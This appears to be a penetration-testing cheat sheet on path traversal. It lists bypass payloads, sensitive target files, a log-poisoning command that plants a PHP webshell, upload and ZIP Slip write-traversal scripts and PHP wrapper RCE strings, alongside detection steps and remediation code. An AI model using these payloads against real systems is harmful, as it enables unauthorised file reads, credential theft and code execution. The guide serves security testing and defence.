---
title: Path Traversal 
---

# Path Traversal

Path traversal is a vulnerability (CWE-22) where user input manipulates file paths to access unauthorized files/directories outside the web root. Attackers use "../" sequences or variants to "traverse" up the directory tree, reading sensitive data like configs or system files

## Fundamentals of Path Traversal

Path traversal fundamentally works by exploiting apps that concatenate unsanitized user input directly into file paths without validation. 

**Normal flow**: 

```jsx
App intends  /var/www/images/ + photo.jpg → /var/www/images/photo.jpg 
```

(safe, web-root bounded).

**Traversal conversion**: 

User supplies `../../../etc/passwd → resolves to /etc/passwd` via OS normalization, escaping root attackers’ chain `"../"` to climb directories

### What is core difference Between in the LFI, path traversal & SSRF?

| Vulnerability | Target | Mechanism | Primary Impact |
| --- | --- | --- | --- |
| **Path Traversal (CWE-22)** | Local filesystem paths | Manipulates directory sequences ("../") to escape intended root and read arbitrary files | Arbitrary file **read** (configs, /etc/passwd); no execution [owasp](https://owasp.org/www-community/attacks/Path_Traversal) |
| **LFI (Local File Inclusion)** | Dynamic file **includes** (include(), require()) | Same path manipulation + server-side **execution** of included file content | File read **+ potential RCE** if PHP/ASP code in target file [reddit+1](https://www.reddit.com/r/netsecstudents/comments/ex7zfw/what_is_ssrf_vs_rfi/) |
| **SSRF (CWE-918)** | **Network requests** (URLs) | Forces server to make unintended HTTP/FTP requests to internal/external systems | Internal network access, cloud metadata (169.254.169.254), no filesystem access [reddit](https://www.reddit.com/r/netsecstudents/comments/ex7zfw/what_is_ssrf_vs_rfi/) |

***Path Traversal → provides the primitive.*** 

***LFI → weaponizes it for execution.*** 

***SSRF → pivots to network abuse***

## Attack Surface

Common entry points to look for path traversal:

| Parameter / Area | Example |
| --- | --- |
| File download/view params | `?file=`, `?path=`, `?doc=`, `?page=`, `?template=` |
| Image loading endpoints | `?img=`, `?photo=`, `?icon=` |
| Log viewer / Report download | `?log=`, `?report=`, `?export=` |
| Language/locale file loading | `?lang=en`, `?locale=fr` |
| Server-side includes | PHP `include($_GET['page'])` |
| PDF / Document generators | HTML-to-PDF tools fetching local file paths |
| API endpoints | REST APIs accepting file paths in body/headers |
| Archive extraction | ZIP/TAR processing with user-supplied filenames |

---

## Exploiting Path Traversal

Path traversal fundamentals involve types (read/write), bypass variants (encodings/nested), and recent CVEs often found in testing APIs, proxies, and misconfigs. These enable arbitrary file access during VAPT/bug bounties by chaining with weak validation.

### Recent CVEs (2022-2026)

Common in testing: APIs (Node.js/Go), servers (Apache), SAP/enterprise.

| CVE | Year | Type/Bypass | Found In Testing |
| --- | --- | --- | --- |
| CVE-2025-42937 | 2025 | Write traversal (%2e%2e%2f) | SAP Print Service; unauth overwrite [redrays](https://redrays.io/blog/cve-2025-42937-critical-directory-traversal-vulnerability-in-sap-print-service/) |
| CVE-2021-42013 | 2021* | Double encode (Apache fix fail) | HTTPD 2.4.50; wild exploits [qualys](https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013) |
| Recent GitLab | 2024 | Nested groups (5+ levels) | Public projects; file read [yeswehack](https://www.yeswehack.com/learn-bug-bounty/practical-guide-path-traversal-attacks) |
| CVE-2024-23657 | 2024 | Path param (Nuxt) | Devtools; token leak [ from prior] |

### 1. Absolute Traversal

Absolute (CWE-37) uses full root paths like `/etc/passwd` or `C:\Windows\win.ini` directly, bypassing relative `"../"` checks. Rare because most apps strip leading `/` or enforce relative paths, but succeeds when input constructs absolute paths without validation.

**Exploitation**:

```jsx
Normal: ?file=photo.jpg → /var/www/images/photo.jpg
Absolute: ?file=/etc/passwd → /etc/passwd (direct FS access)
```

- Targets root-owned files readable by web server (e.g., `/proc/version`, `/etc/hosts`).
- Common in `open(filename)` without `os.path.join(base, filename)` or absolute path allowance.

**Bypasses**:

| **Filter Type** | **Payload** | **Why Works** |
| --- | --- | --- |
| Strips "../" only | `/etc/passwd` | Ignores relative seqs  |
| No leading "/" block | `////etc/passwd` | Multi-slash normalization  |
| Windows tolerant | `C:\windows\win.ini` | Drive letter absolute  |
| Encoding | `%2fetc%2fpasswd` | Decode to absolute  |

***Testing Note: Use when relative fails; PortSwigger labs confirm via `/etc/passwd` retrieval despite `"../"` blocks***

### 2. Relative Traversal

Relative (CWE-22) uses `"../"` sequences to climb up directory levels from the intended base path, most common (90%+ cases). Exploits apps that concatenate user input without canonicalization, resolving to unauthorized files via OS path normalization.

**Exploitation**:

`textNormal: ?file=photo.jpg → /var/www/images/photo.jpg
Relative: ?file=../../../etc/passwd → /etc/passwd (climbs 3 dirs up)`

- Count depths needed
- Targets: `/etc/passwd`, `../.env`, `/proc/self/environ` (web-readable).

**Bypasses** (partially filtered):

| **Filter Type** | **Payload** | **Why Works** |
| --- | --- | --- |
| Literal "../" block | `..%2f..%2fetc%2fpasswd` | URL decode  |
| Single decode | `..%252f..%252f` | Double decode (WAF/proxy) |
| Regex partial | `....//....//etc/passwd` | Nested traversal  |
| Dot filters | `./../../../etc/passwd` | ./ normalization  |
| Mixed OS | `..\\..\\windows\\win.ini` | Backslash tolerant  |

***Testing Note: Start with 5-10 depths; ffuf wordlist for automation. Success = unique file content in response.***

### 3. Write/Upload Traversal

Exploits file upload functions without path sanitization, allowing files to be written outside the intended directory.

**Exploit:**

```
Upload filename: ../../../var/www/html/shell.php
Result: shell.php written to web root → <?php system($_GET['cmd']); ?>
```

- **ZIP Slip variant:** ZIP archive with entry path `../../../../etc/cron.d/backdoor` — extraction writes anywhere.
- **Common targets:** CMS (WordPress plugins), GitLab uploads, Java apps (JAR=ZIP).

**Bypass table:**

| Filter | Payload Filename | Why it Works |
| --- | --- | --- |
| Strips `../` | `..%2f..%2fshell.php` | Decoded after strip |
| Extension check | `shell.php%00.jpg` | Null byte truncates (PHP < 5.3.4) |
| Dir traversal block | `....//shell.php` | Nested sequence |
| MIME only | `../../../../shell.jsp` | Filename ignored during MIME check |

---

### 4. Proxy / Internal Traversal

Path traversal chained with SSRF — user-controlled input in network fetch URLs triggers reading of internal/local files using `file://` or proxy path manipulation.

**Exploit:**

```
Normal:  ?url=https://example.com/logo.png → fetches remote image
Attack:  ?url=file:///etc/passwd → server reads local file
         ?url=http://127.0.0.1@../../etc/passwd → proxy path traversal
```

**Bypass table:**

| Filter | Payload | Why it Works |
| --- | --- | --- |
| URL scheme block | `file:///etc/passwd` | Local file protocol |
| Host validation | `http://127.0.0.1:80@../../etc/passwd` | Proxy auth bypass |
| Internal IP block | `http://[::]:80/../../etc/passwd` | IPv6 localhost |
| Protocol strip | `dict://localhost:80/etc/passwd` | Alt protocol |

---

## Bypasses (Expanded)

### Linux Targets & Payloads

```bash
# Basic
../../../etc/passwd
../../../../etc/shadow

# URL encoded
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encoded
..%252F..%252F..%252Fetc%252Fpasswd

# Useful target files
/etc/passwd              → user list
/etc/shadow              → password hashes (requires root read)
/etc/hosts               → hostname mapping
/home/<user>/.ssh/id_rsa → SSH private key
/var/www/html/config.php → DB credentials
/proc/self/environ       → environment variables (may contain secrets)
/proc/self/cmdline       → running process command
/var/log/apache2/access.log → for log poisoning
```

### Windows Targets & Payloads

```
# Basic
..\..\..\windows\system32\drivers\etc\hosts
..\..\boot.ini

# Mixed separators (bypasses some filters)
../..\..\windows\win.ini

# URL encoded
..%5C..%5C..%5Cwindows%5Cwin.ini

# Useful target files
C:\windows\win.ini                           → basic existence test
C:\windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config               → IIS config with credentials
C:\xampp\apache\conf\httpd.conf
C:\Users\Administrator\.ssh\id_rsa
```

### Full Bypass Encoding Matri

| Technique | Payload Example | Notes |
| --- | --- | --- |
| Simple traversal | `../../../etc/passwd` | Baseline |
| URL encode | `..%2F..%2Fetc%2Fpasswd` | First level decode |
| Double URL encode | `..%252F..%252Fetc%252Fpasswd` | Double encoded `/` |
| Unicode / UTF-8 overlong | `..%c0%af..%c0%afetc%c0%afpasswd` | Overlong encoding |
| Backslash (Windows) | `..\..\..\windows\win.ini` | Windows-only |
| Mixed separators | `..\/..\/etc/passwd` | Confuses normalization |
| Stripped traversal | `....//....//etc/passwd` | Non-recursive strip |
| Null byte (PHP < 5.3.4) | `../../../etc/passwd%00.jpg` | Truncates at `%00` |
| Path normalization bypass | `/./../../etc/passwd` | Some parsers normalize differently |
| 16-bit encoding (IIS) | `%u002e%u002e%u2215etc%u2215passwd` | IIS-specific |
| Absolute path | `/etc/passwd` | If no prefix prepended by app |
| Double slash WAF bypass | `....//....//etc/passwd` | WAF sees no `../`, backend strips extras |

> ⚠️ **Null Byte Clarification:** The `%00` null byte truncation trick only works in **PHP versions prior to 5.3.4**. On PHP 5.3.4+, this is patched. Always note the PHP/server version before reporting.
> 

---

## Advanced Attack Scenarios

### 1. Log Poisoning → RCE

When path traversal allows reading server log files, inject PHP code via HTTP headers first, then include the log file:

```bash
# Step 1: Poison the access log with a PHP payload in User-Agent
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" <https://target.com/>

# Step 2: Include the log file via path traversal
GET /index.php?page=../../../var/log/apache2/access.log&cmd=id
```

---

### 2. WAF vs Backend Normalization Discrepancy

WAFs and backend servers may normalize paths differently — exploit the disagreement:

```
# WAF sees:  ....//....//etc/passwd  → no ../ detected → passes
# Nginx normalizes ....// → ../  → resolves to /etc/passwd

# Another example:
# WAF sees:  /static/%2e%2e/admin  → no traversal detected
# Apache URL-decodes → /static/../admin → serves /admin
```

Test approach: cycle through encoding variants until WAF and backend disagree.

---

### 3. PHP Wrapper Abuse (LFI Escalation)

When path traversal leads to PHP `include()`, escalate using PHP stream wrappers:

```bash
# Read PHP source code (base64 encoded — bypasses PHP execution)
?page=php://filter/convert.base64-encode/resource=config.php

# Direct code execution (if expect module enabled)
?page=expect://id

# Data URI injection
?page=data://text/plain,<?php system('id'); ?>
```

---

### 4. Nginx Alias Off-by-Slash Misconfiguration

```
# Vulnerable config — missing trailing slash on alias
location /files { alias /data/uploads/; }

# Attacker request
GET /files../etc/passwd
# Backend resolves: /data/uploads/../etc/passwd → /etc/passwd
```

---

### 5. Spring Boot / Java App Configuration Files

```
../../config/application.properties
../../WEB-INF/classes/application.properties
../../WEB-INF/web.xml
```

---

### 6. Traversal in API Body / JSON

Don't only test GET parameters — test request bodies and headers too:

```json
POST /api/getfile
{
  "filename": "../../../etc/passwd",
  "format": "text"
}
```

Headers:

```
X-File-Path: ../../../etc/passwd
X-Document: ../../../../config.yml
```

---

### 7. ZIP Slip (Archive-based Write Traversal)

```python
import zipfile
zf = zipfile.ZipFile('exploit.zip', 'w')
zf.write('shell.php', '../../../var/www/html/shell.php')
zf.close()
```

Upload → server extracts → file lands outside intended directory.

---

## Test Cases

| Scenario | Payload | Expected Outcome |
| --- | --- | --- |
| Basic Linux traversal | `../../../etc/passwd` | Returns contents of `/etc/passwd` |
| Basic Windows traversal | `..\..\..\windows\win.ini` | Returns contents of `win.ini` |
| URL encoded traversal | `..%2F..%2F..%2Fetc%2Fpasswd` | Encoded `/` bypasses basic filter |
| Double encoded | `..%252F..%252Fetc%252Fpasswd` | Bypasses single-decode filters |
| Stripped `../` bypass | `....//....//etc/passwd` | Non-recursive strip bypassed |
| Null byte (PHP < 5.3.4) | `../../../etc/passwd%00.jpg` | Truncates `.jpg`, reads passwd |
| Absolute path | `/etc/passwd` | Direct file read if no prefix prepended |
| Nginx alias off-by-slash | `/files../etc/passwd` | Alias misconfiguration exploited |
| PHP filter wrapper | `php://filter/convert.base64-encode/resource=index.php` | Returns base64 encoded source |
| Log poisoning | Read access log after injecting PHP in User-Agent | RCE via LFI |
| ZIP Slip | ZIP with `../../shell.php` entry | File written outside upload directory |
| JSON body traversal | `{"filename": "../../../etc/passwd"}` | File contents returned in API response |

---

## Detection Techniques

### A. Manual Detection

1. **Identify file-referencing parameters** — Look for `?file=`, `?path=`, `?doc=`, `?template=`, `?page=` in all requests.
2. **Submit basic payload** — `../../../etc/passwd` — check if response changes (content, length, or error).
3. **Test URL encoding** — If basic blocked, try `..%2F..%2F..%2Fetc%2Fpasswd`.
4. **Test double encoding** — `..%252F..%252Fetc%252Fpasswd`.
5. **Try absolute paths** — `/etc/passwd`, `C:\windows\win.ini`.
6. **Check error messages** — Detailed path errors reveal the server's base directory.
7. **Test in headers** — `X-File-Path`, `X-Document`, `Referer`.
8. **Test JSON/XML body** — Parameters like `{"file": "../../etc/passwd"}`.
9. **Observe response differences** — Same status code but different response length → possible traversal.
10. **Try PHP wrappers** — `php://filter/convert.base64-encode/resource=index.php`.

### B. Automated Detection

| Tool | Usage |
| --- | --- |
| **Burp Suite** (Intruder, Active Scanner) | Fuzz file parameters with traversal wordlist |
| **dotdotpwn** | Dedicated path traversal fuzzer with OS-aware payloads |
| **ffuf** | Fast fuzzing of parameters with traversal payloads |
| **Nuclei** | Templates for known path traversal CVEs |
| **OWASP ZAP** | Active scanner with LFI/traversal detection rules |

**Recommended wordlist:** SecLists `/Fuzzing/LFI/LFI-Jhaddix.txt`

---

## Impact

### Direct Impacts

- **Arbitrary file disclosure** — Read configs (`.env`, DB credentials), `/etc/passwd`, source code.
- **Credential leaks** — API keys, AWS tokens, SSH keys from `/home/user/.ssh/`.
- **Environment exposure** — `/proc/self/environ` reveals internal services and secrets.
- **Source code theft** — Application logic, business secrets.

### Chained Impacts

- **Authentication bypass** — Steal session files, JWT secrets.
- **RCE via write traversal** — Upload webshells to web root via ZIP Slip or write traversal.
- **Log poisoning → RCE** — Inject code into logs, then include via traversal.
- **Lateral movement** — Internal configs → pivot to other services.
- **Cloud compromise** — AWS/GCP metadata (`169.254.169.254`) → full account takeover.

---

## Remediations

### 1. Input Validation (Allowlist)

- Reject traversal patterns: `../`, `..%2f`, `\%2e%2e`, `\x2e\x2e`.
- Allow only safe chars: `a-zA-Z0-9_-.` for filenames.
- Use fixed mapping: `?file=1` → `/var/www/files/doc1.pdf`.

```php
# BAD
$file = $_GET['file'];
readfile($file);

# GOOD
$allowed = ['logo.png', 'doc.pdf'];
if (!in_array($_GET['file'], $allowed)) die("Invalid");
```

### 2. Path Canonicalization

```php
# PHP
$path = realpath("/var/www/uploads/" . $_GET['file']);
if (!str_starts_with($path, '/var/www/uploads/')) {
    die("Access denied");
}
```

```java
// Java
Path base = Paths.get("/var/www/files");
Path resolved = base.resolve(userInput).normalize();
if (!resolved.startsWith(base)) throw new Exception();
```

```python
# Python
from pathlib import Path
base = Path('/var/www/files')
file = (base / user_input).resolve()
if not file.is_relative_to(base): raise ValueError()
```

### 3. Environment Hardening

```bash
# Run web server in chroot
chroot /var/www/html /usr/sbin/apache2

# Restrict permissions
chown www-data:www-data /var/www/files
chmod 755 /var/www/files && chmod 644 /var/www/files/*
```

### 4. Framework Middleware

```jsx
// Express.js
app.use('/files', (req, res, next) => {
  let filePath = path.normalize(req.params.file);
  if (filePath.includes('..') || !filePath.startsWith('/uploads/')) {
    return res.status(403).send('Forbidden');
  }
  next();
});
```

```
# Nginx — block traversal
location /files/ {
    alias /var/www/files/;
    location ~ \.\. { deny all; }
}
```

### Priority Order

1. **Never trust user input** for file paths (architectural fix).
2. **Canonicalize + validate base dir** (code level).
3. **WAF rules** for encoded traversal (`%2e%2e%2f`, `%c0%ae`).

> **Test your fix:** `../../../etc/passwd`, `..%252f..%252f` must return 403 across all variants.
> 

---

## Tools

| Tool | Purpose |
| --- | --- |
| **Burp Suite** (Repeater, Intruder) | Intercept and fuzz path parameters |
| **dotdotpwn** | Automated path traversal and LFI scanner |
| **ffuf** | Fuzz traversal payloads on any endpoint |
| **LFISuite** | LFI exploitation toolkit |
| **Nuclei** | Template-based scanning for traversal CVEs |
| **OWASP ZAP** | Automated security scanner |

---

## Good To Read

- **HackerOne Hacktivity** — Search `"path traversal"` or `"LFI"` for disclosed reports:
    - [https://hackerone.com/reports/2424815](https://hackerone.com/reports/2424815)
    - [https://hackerone.com/reports/358112](https://hackerone.com/reports/358112)
    - [https://hackerone.com/reports/2553411](https://hackerone.com/reports/2553411)
- **PortSwigger Web Security Academy** — Path Traversal labs.
- **Bugcrowd VRT** — Server Security > Path Traversal for severity guidance.

---

## References

- [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [https://portswigger.net/web-security/file-path-traversal](https://portswigger.net/web-security/file-path-traversal)
- [https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
- [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

[OAuth Cheatsheet (1)](https://app.notion.com/p/OAuth-Cheatsheet-1-3af47a46cb0380a2a3e0ec5013f7e79d?pvs=21)